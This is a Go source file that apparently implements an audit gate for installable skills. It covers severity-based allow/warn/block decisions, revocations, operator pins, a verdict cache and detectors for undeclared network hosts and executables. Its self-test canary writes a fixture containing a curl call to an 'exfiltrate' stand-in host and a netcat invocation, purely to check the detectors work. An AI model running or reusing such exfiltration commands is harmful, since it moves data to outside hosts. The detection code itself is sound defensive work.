// Package audit implements the machine-local audit gate (Spec §12): the
// decision semantics, local revocations, operator pins, a blocking canary,
// a small deterministic detector set, and a verdict cache.
//
// Detectors MAY differ between implementations; the decision semantics of
// Spec §12.2 hold whenever audit is enabled.
package audit

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"regexp"
	"sort"
	"strings"

	"github.com/relux-works/curator/internal/capabilities"
	"github.com/relux-works/curator/internal/config"
	"github.com/relux-works/curator/internal/hashing"
)

// Severities and decisions (Spec §12.1, §12.2).
const (
	SeverityInfo     = "info"
	SeverityLow      = "low"
	SeverityMedium   = "medium"
	SeverityHigh     = "high"
	SeverityCritical = "critical"

	DecisionAllow      = "allow"
	DecisionWarn       = "warn"
	DecisionBlock      = "block"
	DecisionRequirePin = "require_pin"
)

var severityRank = map[string]int{
	SeverityInfo: 0, SeverityLow: 1, SeverityMedium: 2, SeverityHigh: 3, SeverityCritical: 4,
}

// PromptVersion and RulesetVersion key the verdict cache together with the
// backend and model (Spec §12.1).
const (
	PromptVersion  = "1"
	RulesetVersion = "1"
)

// Finding is one audit finding.
type Finding struct {
	ID         string `json:"id"`
	Severity   string `json:"severity"`
	File       string `json:"file,omitempty"`
	Evidence   string `json:"evidence"`
	Verifiable bool   `json:"verifiable"`
}

// Subject is one skill under audit.
type Subject struct {
	Name          string
	Source        string
	Git           string
	Commit        string
	Snapshot      string
	SchemaVersion int
	Capabilities  capabilities.Manifest
}

// Report is the audit outcome for one subject.
type Report struct {
	Skill         string
	ContentSHA256 string
	Findings      []Finding
	Decision      string
	Revoked       bool
	Revocation    string
	CacheHit      bool
}

// Decide implements Spec §12.2 over findings.
func Decide(findings []Finding, mode, failOn string) string {
	if len(findings) == 0 {
		return DecisionAllow
	}
	if mode != "strict" || failOn == "off" {
		return DecisionWarn
	}
	threshold, known := severityRank[failOn]
	if !known {
		threshold = severityRank[SeverityHigh]
	}
	for _, finding := range findings {
		if finding.Verifiable && severityRank[finding.Severity] >= threshold {
			return DecisionBlock
		}
	}
	return DecisionWarn
}

// Gate audits every subject and returns warnings and blocking errors per the
// gate behavior of Spec §12.2. It is a no-op when audit is disabled.
func Gate(cfg *config.Config, subjects []Subject) (warnings []string, errs []string) {
	return gate(cfg, subjects, true)
}

// GateReadOnly applies the same decisions while leaving the verdict cache and
// trust state unchanged. It is used for dry-run planning.
func GateReadOnly(cfg *config.Config, subjects []Subject) (warnings []string, errs []string) {
	return gate(cfg, subjects, false)
}

func gate(cfg *config.Config, subjects []Subject, persist bool) (warnings []string, errs []string) {
	if !cfg.Audit.Enabled {
		return nil, nil
	}
	if !runStaticCanary() {
		return nil, []string{"audit blocked: audit canary failed: detectors are not producing expected findings"}
	}
	for _, subject := range subjects {
		report, err := auditSubject(cfg, subject, persist)
		if err != nil {
			errs = append(errs, fmt.Sprintf("audit blocked: %s: %v", subject.Name, err))
			continue
		}
		switch report.Decision {
		case DecisionAllow:
		case DecisionRequirePin:
			errs = append(errs, fmt.Sprintf(
				"audit requires pin: %s: schema v%d has no capabilities; migrate to csk-skill.json schema v3 or pin the content hash %s with a reason",
				subject.Name, subject.SchemaVersion, report.ContentSHA256))
		case DecisionBlock:
			if report.Revoked {
				errs = append(errs, fmt.Sprintf("audit blocked: %s: %s is revoked", subject.Name, report.Revocation))
				continue
			}
			for _, finding := range report.Findings {
				errs = append(errs, fmt.Sprintf("audit blocked: %s: %s %s - %s", subject.Name, finding.Severity, finding.ID, finding.Evidence))
			}
		default: // warn
			for _, finding := range report.Findings {
				warnings = append(warnings, fmt.Sprintf("audit warning: %s: %s %s - %s", subject.Name, finding.Severity, finding.ID, finding.Evidence))
			}
		}
	}
	return warnings, errs
}

// auditSubject runs the pipeline of Spec §12.1 for one subject.
func auditSubject(cfg *config.Config, subject Subject, persist bool) (Report, error) {
	contentHash, err := hashing.ContentSHA256(subject.Snapshot, nil)
	if err != nil {
		return Report{}, err
	}
	report := Report{Skill: subject.Name, ContentSHA256: contentHash}

	// Local revocations block unconditionally (Spec §12.2).
	if reason := revocationReason(cfg, contentHash, subject.Source, subject.Git); reason != "" {
		report.Revoked = true
		report.Revocation = reason
		report.Decision = DecisionBlock
		return report, nil
	}

	// Verdict cache: findings cached by content hash, backend, model, and
	// versions; the decision is recomputed under the current policy.
	if findings, hit := loadCachedFindings(cfg, contentHash); hit {
		report.CacheHit = true
		report.Findings = findings
		report.Decision = decideWithPins(cfg, subject, contentHash, findings)
		return report, nil
	}

	findings := detect(subject.Snapshot, subject.Capabilities)
	if persist {
		storeCachedFindings(cfg, contentHash, subject, findings)
	}
	report.Findings = findings
	report.Decision = decideWithPins(cfg, subject, contentHash, findings)
	return report, nil
}

func decideWithPins(cfg *config.Config, subject Subject, contentHash string, findings []Finding) string {
	pinned := isPinned(cfg, contentHash)
	if cfg.Audit.Mode == "strict" && subject.SchemaVersion < 3 && !pinned {
		return DecisionRequirePin
	}
	if pinned {
		return DecisionAllow
	}
	return Decide(findings, cfg.Audit.Mode, cfg.Audit.FailOn)
}

// revocationReason matches audit.revocations: content hashes or
// source:<glob> patterns over the source, the git URL, and the identity-ish
// normalized form (Spec §12.2).
func revocationReason(cfg *config.Config, contentHash, source, git string) string {
	normalized := hashing.Normalize(contentHash)
	for _, item := range cfg.Audit.Revocations {
		if strings.HasPrefix(item, "source:") {
			pattern := strings.TrimPrefix(item, "source:")
			for _, candidate := range []string{source, git} {
				if candidate == "" {
					continue
				}
				if matched, _ := filepath.Match(pattern, candidate); matched {
					return "source " + pattern
				}
			}
			continue
		}
		if hashing.Normalize(item) == normalized {
			return "content hash " + contentHash
		}
	}
	return ""
}

// Pin records operator trust for a content hash with a reason (Spec §12.2).
func Pin(home, contentHash, reason, pinnedBy string) (string, error) {
	dir := trustDir(home, contentHash)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return "", err
	}
	payload, err := json.MarshalIndent(map[string]any{
		"schema_version": 1,
		"content_sha256": strings.ToLower(contentHash),
		"pinned":         true,
		"pinned_by":      pinnedBy,
		"reason":         reason,
	}, "", "  ")
	if err != nil {
		return "", err
	}
	path := filepath.Join(dir, "trust.json")
	return path, os.WriteFile(path, append(payload, '\n'), 0o644)
}

func isPinned(cfg *config.Config, contentHash string) bool {
	payload, err := os.ReadFile(filepath.Join(trustDir(cfg.Home(), contentHash), "trust.json")) // #nosec G304
	if err != nil {
		return false
	}
	var data struct {
		Pinned bool `json:"pinned"`
	}
	return json.Unmarshal(payload, &data) == nil && data.Pinned
}

func trustDir(home, contentHash string) string {
	return filepath.Join(home, "audit", hashing.Normalize(contentHash))
}

func verdictPath(cfg *config.Config, contentHash string) string {
	key := strings.Join([]string{cfg.Audit.Backend, cfg.Audit.Model, PromptVersion, RulesetVersion}, "-")
	return filepath.Join(trustDir(cfg.Home(), contentHash), "verdict-"+key+".json")
}

func loadCachedFindings(cfg *config.Config, contentHash string) ([]Finding, bool) {
	payload, err := os.ReadFile(verdictPath(cfg, contentHash)) // #nosec G304
	if err != nil {
		return nil, false
	}
	var data struct {
		Findings []Finding `json:"findings"`
	}
	if err := json.Unmarshal(payload, &data); err != nil {
		return nil, false
	}
	return data.Findings, true
}

func storeCachedFindings(cfg *config.Config, contentHash string, subject Subject, findings []Finding) {
	dir := trustDir(cfg.Home(), contentHash)
	if err := os.MkdirAll(dir, 0o755); err != nil {
		return
	}
	payload, err := json.MarshalIndent(map[string]any{
		"schema_version":  1,
		"content_sha256":  strings.ToLower(contentHash),
		"skill":           subject.Name,
		"commit":          subject.Commit,
		"backend":         cfg.Audit.Backend,
		"model":           cfg.Audit.Model,
		"prompt_version":  PromptVersion,
		"ruleset_version": RulesetVersion,
		"findings":        findings,
	}, "", "  ")
	if err != nil {
		return
	}
	_ = os.WriteFile(verdictPath(cfg, contentHash), append(payload, '\n'), 0o644)
}

// Deterministic detectors: observed behavior vs declared capabilities.
var (
	urlRE  = regexp.MustCompile(`https?://([A-Za-z0-9.-]+)`)
	execRE = regexp.MustCompile(`(?m)(?:subprocess|exec\.Command|os\.system|shutil\.which)\(\s*["']([A-Za-z0-9._-]+)["']`)
)

func detect(snapshot string, caps capabilities.Manifest) []Finding {
	var findings []Finding
	declaredHosts := map[string]bool{}
	for _, host := range caps.Network {
		declaredHosts[strings.ToLower(host)] = true
	}
	declaredExec := map[string]bool{}
	for _, name := range caps.Exec {
		declaredExec[name] = true
	}

	_ = filepath.WalkDir(snapshot, func(path string, entry os.DirEntry, err error) error {
		if err != nil || entry.IsDir() {
			return nil
		}
		rel, relErr := filepath.Rel(snapshot, path)
		if relErr != nil {
			return nil
		}
		posix := filepath.ToSlash(rel)
		if !strings.HasPrefix(posix, "scripts/") && posix != "csk-skill.json" {
			return nil
		}
		payload, readErr := os.ReadFile(path) // #nosec G304 -- walked snapshot
		if readErr != nil {
			return nil
		}
		text := string(payload)
		for _, match := range urlRE.FindAllStringSubmatch(text, -1) {
			host := strings.ToLower(match[1])
			if host == "localhost" || host == "127.0.0.1" || declaredHost(declaredHosts, host) {
				continue
			}
			findings = append(findings, Finding{
				ID: "audit.capability.network-undeclared", Severity: SeverityHigh,
				File: posix, Evidence: fmt.Sprintf("contacts %s, which no capabilities.network entry covers", host),
				Verifiable: true,
			})
		}
		for _, match := range execRE.FindAllStringSubmatch(text, -1) {
			binary := match[1]
			if declaredExec[binary] {
				continue
			}
			findings = append(findings, Finding{
				ID: "audit.capability.exec-undeclared", Severity: SeverityMedium,
				File: posix, Evidence: fmt.Sprintf("executes %q, which capabilities.exec does not declare", binary),
				Verifiable: true,
			})
		}
		return nil
	})
	sort.Slice(findings, func(i, j int) bool {
		if findings[i].File != findings[j].File {
			return findings[i].File < findings[j].File
		}
		return findings[i].Evidence < findings[j].Evidence
	})
	return findings
}

func declaredHost(declared map[string]bool, host string) bool {
	if declared[host] {
		return true
	}
	for pattern := range declared {
		if matched, _ := filepath.Match(pattern, host); matched {
			return true
		}
	}
	return false
}

// runStaticCanary plants a known-bad fixture and checks the detectors fire
// (Spec §12.1): a failing canary blocks the audit entirely.
func runStaticCanary() bool {
	dir, err := os.MkdirTemp("", "curator-canary-")
	if err != nil {
		return false
	}
	defer func() { _ = os.RemoveAll(dir) }()
	if err := os.MkdirAll(filepath.Join(dir, "scripts"), 0o755); err != nil {
		return false
	}
	payload := "curl https://exfiltrate.example.com/data\nsubprocess(\"nc\")\n"
	if err := os.WriteFile(filepath.Join(dir, "scripts", "bad"), []byte(payload), 0o644); err != nil {
		return false
	}
	findings := detect(dir, capabilities.ImplicitNone())
	foundNetwork, foundExec := false, false
	for _, finding := range findings {
		if finding.ID == "audit.capability.network-undeclared" {
			foundNetwork = true
		}
		if finding.ID == "audit.capability.exec-undeclared" {
			foundExec = true
		}
	}
	return foundNetwork && foundExec
}
